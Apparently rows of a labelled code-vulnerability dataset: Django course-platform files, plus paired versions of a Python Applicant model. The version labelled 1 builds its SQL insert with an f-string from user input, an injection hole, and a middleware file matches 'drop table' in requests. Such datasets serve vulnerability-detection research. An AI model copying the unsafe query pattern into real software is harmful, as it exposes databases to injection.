            self.templates.append({
                'name': name,
                'content': response.text,
                'html': 'text/html' in response.headers.get('Content-Type'),
            })
        self.note('templates')


class SubmissionView(SubmissionBaseView):
    template_name = ""exercise/submission.html""
    ajax_template_name = ""exercise/submission_plain.html""

    def get_common_objects(self):
        super().get_common_objects()
        self.page = { ""is_wait"": ""wait"" in self.request.GET }
        self.note(""page"")
        #if not self.request.is_ajax():
        self.get_summary_submissions()


class SubmissionPlainView(SubmissionView):
    raise_exception=True
    force_ajax_template=True

    # Allow iframe in another domain.
    @method_decorator(xframe_options_exempt)
    def dispatch(self, request, *args, **kwargs):
        return super().dispatch(request, *args, **kwargs)


class SubmissionPollView(SubmissionMixin, BaseView):

    def get(self, request, *args, **kwargs):
        return HttpResponse(self.submission.status, content_type=""text/plain"")


class SubmittedFileView(SubmissionMixin, BaseView):
    file_kw = ""file_id""
    file_name_kw = ""file_name""

    def get_resource_objects(self):
        super().get_resource_objects()
        file_id = self._get_kwarg(self.file_kw)
        file_name = self._get_kwarg(self.file_name_kw)
        self.file = get_object_or_404(
            SubmittedFile,
            id=file_id,
            submission=self.submission
        )
        if self.file.filename != file_name:
            raise Http404()

    def get(self, request, *args, **kwargs):
        with open(self.file.file_object.path, ""rb"") as f:
            bytedata = f.read()

        # Download the file.
        if request.GET.get(""download"", False):
            response = HttpResponse(bytedata,
                content_type=""application/octet-stream"")
            response[""Content-Disposition""] = 'attachment; filename=""{}""'\
                .format(self.file.filename)
            return response

        if self.file.is_passed():
            return HttpResponse(bytedata, content_type=self.file.get_mime())

        return HttpResponse(bytedata.decode('utf-8', 'ignore'),
            content_type='text/plain; charset=""UTF-8""')
/n/n/n/external_services/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-


from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('inheritance', '0001_initial'),
        ('course', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='LinkService',
            fields=[
                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),
                ('url', models.CharField(help_text=b'The service URL', max_length=256)),
                ('menu_label', models.CharField(help_text=b'A default label to show in the course menu.', max_length=32)),
                ('menu_icon_class', models.CharField(default=b'icon-globe', help_text=b'A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32)),
                ('enabled', models.BooleanField(default=True, help_text=b'If not enabled, the service is disabled for all course instances.')),
            ],
            options={
                'ordering': ['menu_label'],
            },
            bases=('inheritance.modelwithinheritance',),
        ),
        migrations.CreateModel(
            name='LTIService',
            fields=[
                ('linkservice_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='external_services.LinkService')),
                ('consumer_key', models.CharField(help_text=b'The consumer key provided by the LTI service.', max_length=128)),
                ('consumer_secret', models.CharField(help_text=b'The consumer secret provided by the LTI service.', max_length=128)),
            ],
            options={
            },
            bases=('external_services.linkservice',),
        ),
        migrations.CreateModel(
            name='MenuItem',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('menu_label', models.CharField(help_text=b'Overrides service default label shown in the course menu.', max_length=32, null=True, blank=True)),
                ('menu_icon_class', models.CharField(help_text=b'Overrides service default menu icon style, e.g. icon-star see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32, null=True, blank=True)),
                ('menu_weight', models.IntegerField(default=0, help_text=b'Heavier menu entries are placed after lighter ones.')),
                ('enabled', models.BooleanField(default=True)),
                ('course_instance', models.ForeignKey(related_name='ext_services', to='course.CourseInstance', help_text=b'A course instance where the service is used.')),
                ('service', models.ForeignKey(to='external_services.LinkService')),
            ],
            options={
                'ordering': ['course_instance', 'menu_weight', 'menu_label'],
            },
            bases=(models.Model,),
        ),
    ]
/n/n/n/external_services/migrations/0002_auto_20150427_1717.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('external_services', '0001_initial'),
    ]

    operations = [
        migrations.AlterField(
            model_name='linkservice',
            name='enabled',
            field=models.BooleanField(help_text='If not enabled, the service is disabled for all course instances.', default=True),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='linkservice',
            name='menu_icon_class',
            field=models.CharField(help_text='A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs', default='icon-globe', max_length=32),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='linkservice',
            name='menu_label',
            field=models.CharField(help_text='A default label to show in the course menu.', max_length=32),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='linkservice',
            name='url',
            field=models.CharField(help_text='The service URL', max_length=256),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='ltiservice',
            name='consumer_key',
            field=models.CharField(help_text='The consumer key provided by the LTI service.', max_length=128),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='ltiservice',
            name='consumer_secret',
            field=models.CharField(help_text='The consumer secret provided by the LTI service.', max_length=128),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='course_instance',
            field=models.ForeignKey(related_name='ext_services', help_text='A course instance where the service is used.', to='course.CourseInstance'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_icon_class',
            field=models.CharField(null=True, blank=True, help_text='Overrides service default menu icon style, e.g. icon-star see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_label',
            field=models.CharField(null=True, blank=True, help_text='Overrides service default label shown in the course menu.', max_length=32),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_weight',
            field=models.IntegerField(help_text='Heavier menu entries are placed after lighter ones.', default=0),
            preserve_default=True,
        ),
    ]
/n/n/n/external_services/migrations/0005_auto_20160829_1344.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('external_services', '0004_auto_20150828_1210'),
    ]

    operations = [
        migrations.AddField(
            model_name='menuitem',
            name='menu_group_label',
            field=models.CharField(blank=True, null=True, max_length=32, help_text='Places menu item under a group label.'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='menuitem',
            name='menu_url',
            field=models.CharField(blank=True, null=True, max_length=256, help_text='A link URL (else service default). Relative URLs are relative to course root.'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='course_instance',
            field=models.ForeignKey(help_text='A course where the menu item exists.', to='course.CourseInstance', related_name='ext_services'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_icon_class',
            field=models.CharField(blank=True, null=True, max_length=32, help_text='Menu icon style name (else service default), e.g. star see http://getbootstrap.com/components/#glyphicons-glyphs'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_label',
            field=models.CharField(blank=True, null=True, max_length=32, help_text='Label for the menu link (else service default).'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='service',
            field=models.ForeignKey(help_text='If preconfigured, an external service to link.', to='external_services.LinkService', null=True, blank=True),
            preserve_default=True,
        ),
    ]
/n/n/n/inheritance/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-


from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('contenttypes', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='ModelWithInheritance',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('content_type', models.ForeignKey(editable=False, to='contenttypes.ContentType', null=True)),
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
    ]
/n/n/n/lib/email_messages.py/n/nimport logging
import traceback
from django.conf import settings
from django.core.mail import send_mail
from django.core.urlresolvers import reverse

logger = logging.getLogger('lib.email_messages')


def email_course_error(request, exercise, message, exception=True):
    """"""
    Sends error message to course teachers or technical support emails if set.
    """"""
    instance = exercise.course_instance
    if instance.technical_error_emails:
        recipients = instance.technical_error_emails.split("","")
    else:
        recipients = (p.user.email for p in instance.course.teachers.all() if p.user.email)

    error_trace = ""-""
    if exception:
        error_trace = traceback.format_exc()

    subject = settings.EXERCISE_ERROR_SUBJECT.format(
        course=instance.course.code,
        exercise=str(exercise))
    body = settings.EXERCISE_ERROR_DESCRIPTION.format(
        message=message,
        exercise_url=request.build_absolute_uri(
            exercise.get_absolute_url()),
        course_edit_url=request.build_absolute_uri(
            instance.get_url('course-details')),
        error_trace=error_trace,
        request_fields=repr(request))
    if recipients:
        try:
            send_mail(subject, body, settings.SERVER_EMAIL, recipients, True)
        except Exception as e:
            logger.exception('Failed to send error emails.')
/n/n/n/lib/middleware.py/n/n""""""
This middleware is an easter egg! It is invoked when any request parameters
contain the string ""drop table"" (a potential SQL injection) and prevents the
user from loading any pages. Instead, a response with internal server error code
is returned with a ""funny"" error message. The SQL injection attempt is stored in
the session, so that the problem persists even if the user reloads the page.
Other users and the actual system are not affected by this middleware.

The normal behavior can be restored by giving any request parameter value with the
string ""restore table"" in it.
""""""

from django.http import HttpResponseServerError

class SqlInjectionMiddleware(object):

    def process_request(self, request):
        for var in request.GET:
            val = request.GET.get(var).lower()
            if ""drop table"" in val:
                request.session[""hack_attempt""] = val
            if ""restore table"" in val and ""hack_attempt"" in request.session:
                del request.session[""hack_attempt""]

        if ""hack_attempt"" in request.session:
            return HttpResponseServerError(""Traceback (most recent call last):\nFile \""egg.py\"", line 1337, in aplus\nDatabaseIntegrityError: aHR0cDovL3hrY2QuY29tLzMyNy8= is not a valid base64 table identifier"", content_type=""text/plain"")

        return None
/n/n/n/news/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import lib.models
import django.utils.timezone


class Migration(migrations.Migration):

    dependencies = [
        ('course', '0028_auto_20160825_0601'),
    ]

    operations = [
        migrations.CreateModel(
            name='News',
            fields=[
                ('id', models.AutoField(serialize=False, primary_key=True, auto_created=True, verbose_name='ID')),
                ('audience', models.IntegerField(choices=[(1, 'Internal users'), (2, 'External users'), (3, 'Internal and external users')], default=3)),
                ('publish', models.DateTimeField(default=django.utils.timezone.now)),
                ('title', models.CharField(max_length=255)),
                ('body', models.TextField()),
                ('pin', models.BooleanField(default=False)),
                ('alert', models.CharField(choices=[('', 'No alert'), ('danger', 'Red / Danger'), ('info', 'Blue / Info'), ('success', 'Green / Success'), ('warning', 'Yellow / Warning')], max_length=8, blank=True, default='')),
                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='news')),
            ],
            options={
                'ordering': ['course_instance', '-pin', '-publish'],
            },
            bases=(models.Model, lib.models.UrlMixin),
        ),
    ]
/n/n/n/news/templatetags/news.py/n/nfrom django import template
from django.utils import timezone

from lib.errors import TagUsageError
from ..cache import CachedNews
from ..models import News


register = template.Library()


@register.inclusion_tag(""news/user_news.html"", takes_context=True)
def user_news(context, num, more=0):
    if not 'instance' in context:
        raise TagUsageError()
    if not 'now' in context:
        context['now'] = timezone.now()
    if not 'course_news' in context:
        context['course_news'] = CachedNews(context['instance'])
    news = context['course_news']

    if context['is_course_staff']:
        alerts,news = news.for_staff()
    else:
        user = context['request'].user
        alerts,news = news.for_user(
            not user.is_authenticated()
            or user.userprofile.is_external
        )

    i = 0
    for item in news:
        i += 1
        item['collapsed'] = i > num
        if more > 0 and i == more:
            item['begin_more'] = True

    return {
        'is_course_staff': context['is_course_staff'],
        'now': context['now'],
        'alerts': alerts,
        'news': news,
        'more': more,
    }


@register.filter
def is_published(entry, now):
    return entry['publish'] <= now


@register.filter
def news_audience(audience):
    return News.AUDIENCE[audience]
/n/n/n/notification/cache.py/n/nfrom django.db.models.signals import post_save, post_delete

from lib.cache import CachedAbstract
from .models import Notification


class CachedNotifications(CachedAbstract):
    KEY_PREFIX = ""notifications""

    def __init__(self, user):
        super().__init__(user)

    def _generate_data(self, user, data=None):
        if not user or not user.is_authenticated():
            return {
                'count': 0,
                'notifications': [],
            }

        def notification_entry(n):
            exercise = n.submission.exercise if n.submission else None
            return {
                'id': n.id,
                'submission_id': n.submission.id if n.submission else 0,
                'name': ""{} {}, {}"".format(
                    n.course_instance.course.code,
                    (str(exercise.parent)
                        if exercise and exercise.parent else
                     n.course_instance.instance_name),
                    (str(exercise)
                        if exercise else
                     n.subject),
                ),
                'link': n.get_display_url(),
            }

        notifications = list(
            user.userprofile.received_notifications\
                .filter(seen=False)\
                .select_related(
                    'submission',
                    'submission__exercise',
                    'course_instance',
                    'course_instance__course',
                )
        )
        return {
            'count': len(notifications),
            'notifications': [notification_entry(n) for n in notifications],
        }

    def count(self):
        return self.data['count']

    def notifications(self):
        return self.data['notifications']


def invalidate_notifications(sender, instance, **kwargs):
    CachedNotifications.invalidate(instance.recipient.user)


# Automatically invalidate cache when notifications change.
post_save.connect(invalidate_notifications, sender=Notification)
post_delete.connect(invalidate_notifications, sender=Notification)
/n/n/n/notification/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-


from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0001_initial'),
        ('course', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='Notification',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('subject', models.CharField(max_length=255)),
                ('notification', models.TextField()),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('seen', models.BooleanField(default=False)),
                ('course_instance', models.ForeignKey(to='course.CourseInstance')),
                ('recipient', models.ForeignKey(related_name='received_notifications', to='userprofile.UserProfile')),
                ('sender', models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile')),
            ],
            options={
                'ordering': ['-timestamp'],
            },
            bases=(models.Model,),
        ),
    ]
/n/n/n/notification/migrations/0002_auto_20160912_1341.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0022_auto_20160906_1401'),
        ('notification', '0001_initial'),
    ]

    operations = [
        migrations.AddField(
            model_name='notification',
            name='submission',
            field=models.ForeignKey(to='exercise.Submission', blank=True, null=True),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='notification',
            name='notification',
            field=models.TextField(blank=True),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='notification',
            name='sender',
            field=models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile', blank=True, null=True),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='notification',
            name='subject',
            field=models.CharField(blank=True, max_length=255),
            preserve_default=True,
        ),
    ]
/n/n/n/notification/migrations/0003_auto_20160914_1051.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('notification', '0002_auto_20160912_1341'),
    ]

    operations = [
        migrations.AlterField(
            model_name='notification',
            name='submission',
            field=models.ForeignKey(blank=True, related_name='notifications', null=True, to='exercise.Submission'),
            preserve_default=True,
        ),
    ]
/n/n/n/selenium_test/grader/exercises/views.py/n/nfrom django.http import HttpResponse
from django.shortcuts import render
from django.core.urlresolvers import reverse


def first(request):

    if request.method == ""POST"":
        submission = request.POST.get(""answer"", """").lower()
        points = 0
        if 'hello' in submission:
            points += 1
        if 'a+' in submission:
            points += 1
        return render(request, ""exercises/first_result.html"", {
            ""points"": points,
            ""max_points"": 2,
        })

    return render(request, ""exercises/first_exercise.html"")


def file(request):

    if request.method == ""POST"":
        if ""myfile"" in request.FILES and request.FILES[""myfile""].name:
            status = ""accepted""
        else:
            status = ""error""
        return render(request, ""exercises/file_result.html"", {
            ""status"": status,
        })

    return render(request, ""exercises/file_exercise.html"")


def ajax(request):

    def parse_int(s):
        try:
            return int(s)
        except Exception:
            return 0

    if request.method == ""POST"":
        points = parse_int(request.POST.get(""points""))
        max_points = parse_int(request.POST.get(""max_points""))
        url = request.GET.get(""submission_url"")

        def respond_text(text):
            response = HttpResponse(text)
            response[""Access-Control-Allow-Origin""] = ""*""
            return response

        if not url:
            return respond_text('{ ""errors"": [""Missing submission_url""] }')

        import requests
        response = requests.post(url, timeout=3, data={
            ""points"": points,
            ""max_points"": max_points,
            ""feedback"": ""You got {} / {} points for your answer."".format(points, max_points),
            ""grading_payload"": ""{}"",
        })
        return respond_text(response.text)

    return render(request, ""exercises/ajax_exercise.html"", {
        ""url"": request.build_absolute_uri(""{}?{}"".format(
            reverse(""ajax""), request.META.get(""QUERY_STRING"", """")
        )),
    })
/n/n/n/shibboleth_login/tests.py/n/nimport urllib.parse

from django.conf import settings
from django.contrib.auth.models import User
from django.core.urlresolvers import reverse
from django.test import TestCase, modify_settings
from django.utils import timezone


DEF_SHIBD_META = {
    'SHIB_cn': 'Teemu Teekkari',
    'SHIB_mail': 'teemu.teekkari@aalto.fi',
    'Shib-Authentication-Method': 'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport',
    'Shib-Identity-Provider': 'https://locahost/idp/shibboleth',
    'SHIB_displayName': 'Teemudemus',
    'Shib-AuthnContext-Class': 'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport',
    'SHIB_schacPersonalUniqueCode': 'urn:mace:terena.org:schac:personalUniqueCode:int:studentID:aalto.fi:123453',
    'Shib-Session-Index': '_941d95bafed0b1787c81541e627a8c8b',
    'SHIB_sn': 'Teekkari',
    'SHIB_givenName': 'Teemu',
    'Shib-Application-ID': 'default',
    'Shib-Authentication-Instant': str(timezone.now()),
    'Shib-Session-ID': '_92d7c6a832b5c7dafea59ea12ca1289e',
    'SHIB_preferredLanguage': 'fi',
    'SHIB_logouturl': 'https://localhost/idp/aalto_logout.jsp',
    'SHIB_eppn': 'teekkarit@aalto.fi',
}

@modify_settings(
    INSTALLED_APPS={'append': 'shibboleth_login'},
    AUTHENTICATION_BACKENDS={'append': 'shibboleth_login.auth_backend.ShibbolethAuthBackend'},
)
class ShibbolethTest(TestCase):

    def setUp(self):
        self.user = User(
            username='meikalm8@aalto.fi',
            email='',
            first_name='Matti',
            last_name='Sukunimi',
        )
        self.user.set_unusable_password()
        self.user.save()
        self.user.userprofile.student_id = '000'
        self.user.userprofile.save()

        self.login_url = reverse('shibboleth-login')

    def test_invalid(self):
        meta = DEF_SHIBD_META.copy()
        del meta['SHIB_eppn']
        response = self._get(meta)
        self.assertEqual(response.status_code, 403)
        self.assertEqual(User.objects.count(), 1)

    def test_valid_new(self):
        meta = DEF_SHIBD_META.copy()
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 2)
        user = User.objects.get(username='teekkarit@aalto.fi')
        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')
        self.assertEqual(user.first_name, 'Teemu')
        self.assertEqual(user.last_name, 'Teekkari')
        self.assertEqual(user.userprofile.student_id, '123453')

    def test_without_email(self):
        meta = DEF_SHIBD_META.copy()
        del meta['SHIB_mail']
        del meta['SHIB_givenName']
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 2)
        user = User.objects.get(username='teekkarit@aalto.fi')
        self.assertEqual(user.email, '{:d}@localhost'.format(user.id))
        self.assertEqual(user.first_name, '')
        self.assertEqual(user.last_name, 'Teekkari')
        self.assertEqual(user.userprofile.student_id, '123453')

    def test_without_student_id(self):
        meta = DEF_SHIBD_META.copy()
        del meta['SHIB_schacPersonalUniqueCode']
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 2)
        user = User.objects.get(username='teekkarit@aalto.fi')
        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')
        self.assertEqual(user.first_name, 'Teemu')
        self.assertEqual(user.last_name, 'Teekkari')
        self.assertEqual(user.userprofile.student_id, None)

    def test_valid_old(self):
        meta = DEF_SHIBD_META.copy()
        meta['SHIB_eppn'] = self.user.username
        del meta['SHIB_sn']
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 1)
        user = User.objects.first()
        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')
        self.assertEqual(user.first_name, 'Teemu')
        self.assertEqual(user.last_name, 'Sukunimi')
        self.assertEqual(user.userprofile.student_id, '123453')

    def test_nonascii(self):
        meta = DEF_SHIBD_META.copy()
        meta['SHIB_eppn'] = self.user.username.encode('utf-8')
        del meta['SHIB_givenName']
        meta['SHIB_sn'] = 'Meikäläinen'
        del meta['SHIB_schacPersonalUniqueCode']
        response = self._get(meta)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.count(), 1)
        user = User.objects.first()
        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')
        self.assertEqual(user.first_name, 'Matti')
        self.assertEqual(user.last_name, 'Meikäläinen')
        self.assertEqual(user.userprofile.student_id, '000')

    def test_inactive(self):
        self.user.is_active = False
        self.user.save()
        meta = DEF_SHIBD_META.copy()
        meta['SHIB_eppn'] = self.user.username.encode('utf-8')
        response = self._get(meta)
        self.assertEqual(response.status_code, 403)
        self.assertEqual(User.objects.count(), 1)

    def _get(self, meta):
        if settings.SHIBBOLETH_VARIABLES_URL_ENCODED:
            for key in meta.keys():
                meta[key] = urllib.parse.quote(meta[key])
        return self.client.generic('GET', self.login_url, **meta)
/n/n/n/threshold/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('course', '0032_auto_20170215_0953'),
        ('exercise', '0025_auto_20170215_0953'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseModuleRequirement',
            fields=[
                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),
                ('negative', models.BooleanField(default=False)),
                ('module', models.ForeignKey(to='course.CourseModule', related_name='requirements')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='Threshold',
            fields=[
                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),
                ('name', models.CharField(max_length=255)),
                ('consume_harder_points', models.BooleanField(help_text='Harder points are consumed by easier difficulty requirements.', default=False)),
                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='thresholds')),
                ('passed_categories', models.ManyToManyField(blank=True, to='course.LearningObjectCategory')),
                ('passed_exercises', models.ManyToManyField(blank=True, to='exercise.BaseExercise')),
                ('passed_modules', models.ManyToManyField(blank=True, to='course.CourseModule')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='ThresholdPoints',
            fields=[
                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),
                ('limit', models.PositiveIntegerField()),
                ('difficulty', models.CharField(blank=True, max_length=32)),
                ('order', models.PositiveIntegerField(default=1)),
                ('threshold', models.ForeignKey(to='threshold.Threshold', related_name='points')),
            ],
            options={
                'ordering': ['threshold', 'order'],
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='coursemodulerequirement',
            name='threshold',
            field=models.ForeignKey(to='threshold.Threshold'),
            preserve_default=True,
        ),
    ]
/n/n/n/userprofile/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-


from django.db import models, migrations
from django.conf import settings


class Migration(migrations.Migration):

    dependencies = [
        migrations.swappable_dependency(settings.AUTH_USER_MODEL),
    ]

    operations = [
        migrations.CreateModel(
            name='StudentGroup',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(unique=True, max_length=32)),
                ('description', models.CharField(max_length=256)),
                ('member_limit', models.PositiveIntegerField()),
                ('is_public', models.BooleanField(default=False)),
                ('invitation_key', models.CharField(max_length=10, blank=True)),
            ],
            options={
                'ordering': ['name'],
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='UserProfile',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('lang', models.CharField(default=b'en_US', max_length=5)),
                ('student_id', models.CharField(max_length=25, null=True, blank=True)),
                ('user', models.OneToOneField(to=settings.AUTH_USER_MODEL)),
            ],
            options={
                'ordering': ['id'],
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='studentgroup',
            name='members',
            field=models.ManyToManyField(related_name='groups', to='userprofile.UserProfile'),
            preserve_default=True,
        ),
    ]
/n/n/n/userprofile/viewbase.py/n/nfrom django.core.exceptions import PermissionDenied
from django.template.response import SimpleTemplateResponse

from lib.viewbase import BaseMixin, BaseTemplateView
from authorization.permissions import ACCESS
from .models import UserProfile


class UserProfileMixin(BaseMixin):
    access_mode = ACCESS.STUDENT
    login_redirect = True

    def get_resource_objects(self):
        super().get_resource_objects()
        user = self.request.user
        if user.is_authenticated():
            self.profile = profile = user.userprofile
            self.is_external_student = profile.is_external
        else:
            self.profile = None
            self.is_external_student = False

        # Add available for template
        self.note(""profile"", ""is_external_student"")


class UserProfileView(UserProfileMixin, BaseTemplateView):
    pass
/n/n/n/userprofile/views.py/n/nimport logging
from django.conf import settings
from django.contrib.auth import REDIRECT_FIELD_NAME
from django.contrib.auth.views import login as django_login
from django.core.cache import cache
from django.core.cache.utils import make_template_fragment_key
from django.http.response import HttpResponseRedirect
from django.shortcuts import resolve_url
from django.template.loader import TemplateDoesNotExist, get_template
from django.utils.http import is_safe_url
from django.utils.translation import get_language
from django.utils.translation import ugettext_lazy as _

from lib.helpers import settings_text
from authorization.permissions import ACCESS
from .viewbase import UserProfileView


logger = logging.getLogger('userprofile.views')


def login(request):
    """"""
    Wraps the default login view in Django. Additionally redirects already
    authenticated users automatically to the target.
    """"""
    if request.user.is_authenticated():
        redirect_to = request.POST.get(REDIRECT_FIELD_NAME,
                                       request.GET.get(REDIRECT_FIELD_NAME, ''))
        if not is_safe_url(url=redirect_to, host=request.get_host()):
            redirect_to = resolve_url(settings.LOGIN_REDIRECT_URL)
        return HttpResponseRedirect(redirect_to)

    return django_login(
        request,
        template_name=""userprofile/login.html"",
        extra_context={
            'shibboleth_login': 'shibboleth_login' in settings.INSTALLED_APPS,
            'mooc_login': 'social_django' in settings.INSTALLED_APPS,
            'login_title_text': settings_text('LOGIN_TITLE_TEXT'),
            'login_body_text': settings_text('LOGIN_BODY_TEXT'),
            'login_button_text': settings_text('LOGIN_BUTTON_TEXT'),
            'shibboleth_title_text': settings_text('SHIBBOLETH_TITLE_TEXT'),
            'shibboleth_body_text': settings_text('SHIBBOLETH_BODY_TEXT'),
            'shibboleth_button_text': settings_text('SHIBBOLETH_BUTTON_TEXT'),
            'mooc_title_text': settings_text('MOOC_TITLE_TEXT'),
            'mooc_body_text': settings_text('MOOC_BODY_TEXT'),
        }
    )


def try_get_template(name):
    try:
        return get_template(name)
    except TemplateDoesNotExist:
        logger.info(""Template %s not found"", name)
        return None


class PrivacyNoticeView(UserProfileView):
    access_mode=ACCESS.ANONYMOUS
    template_name=""userprofile/privacy.html""

    def get_common_objects(self):
        super().get_common_objects()
        lang = ""_"" + get_language().lower()
        key = make_template_fragment_key('privacy_notice', [lang])
        privacy_text = cache.get(key)
        if not privacy_text:
            template_name = ""privacy_notice{}.html""
            template = try_get_template(template_name.format(lang))
            if not template and len(lang) > 3:
                template = try_get_template(template_name.format(lang[:3]))
            if not template:
                logger.warning(""No localized privacy notice for language %s"", lang)
                template = try_get_template(template_name.format(''))
            if not template:
                logger.error(""No privacy notice at all!"")

            privacy_text = template.render() if template else _(""No privacy notice. Please notify administration!"")
            cache.set(key, privacy_text)
        self.privacy_text = privacy_text
        self.note(""privacy_text"")

class ProfileView(UserProfileView):
    template_name = ""userprofile/profile.html""
/n/n/n",1
58,58,8480be1977c56f659a3a2b45d2838ced4c13a3a3,"experimental/python/buford/model/applicant.py/n/nfrom dataclasses import dataclass

import psycopg2
import pytz

from config import get_connection


@dataclass
class Applicant:
    email: str
    registration_time: pytz

    def on_save(self) -> int:
        connection = get_connection()
        cursor = connection.cursor()
        try:
            cursor.execute(
                """"""
                insert into applicants (email, registration_time) values (%s, %s);"", (self.email, self.registration_time))
            connection.commit()
        except psycopg2.IntegrityError:
            print(""this email already exists"")
            return 1
        connection.close()
        return 0
/n/n/n",0
59,59,8480be1977c56f659a3a2b45d2838ced4c13a3a3,"/experimental/python/buford/model/applicant.py/n/nfrom dataclasses import dataclass

import psycopg2
import pytz

from config import get_connection


@dataclass
class Applicant:
    email: str
    registration_time: pytz

    def on_save(self) -> int:
        connection = get_connection()
        cursor = connection.cursor()
        try:
            cursor.execute(
                f""insert into applicants (email, registration_time) values ('{self.email}', '{self.registration_time}');"")
            connection.commit()
        except psycopg2.IntegrityError:
            print(""this email already exists"")
            return 1
        connection.close()
        return 0
/n/n/n",1
118,118,3b85c99a373267bb85b1c9d88aab3f0c38494606,"application/articles/models.py/n/nfrom application import db, os
from application.help import getArticlesWithCondition
from application.models import Base
from sqlalchemy.sql import text

class Article(Base):

      name = db.Column(db.String(144), nullable=False)
      issue = db.Column(db.Integer, db.ForeignKey('issue.id'), nullable=True)
      pages = db.Column(db.Integer, nullable=True)
      editor_in_charge = db.Column(db.Integer, db.ForeignKey('account.id'), nullable=True)
      editing_status = db.Column(db.Integer, nullable=False)
      editing_status_text = db.Column(db.String(144), nullable=True)
      writer = db.Column(db.Integer, db.ForeignKey('account.id'), nullable=True)
      writing_status = db.Column(db.Integer, nullable=False)
      writing_status_text = db.Column(db.String(144), nullable=True)
      title = db.Column(db.String(144), nullable=True)
      subtitle = db.Column(db.String(144), nullable=True)
      TOC_text = db.Column(db.String(144), nullable=True)
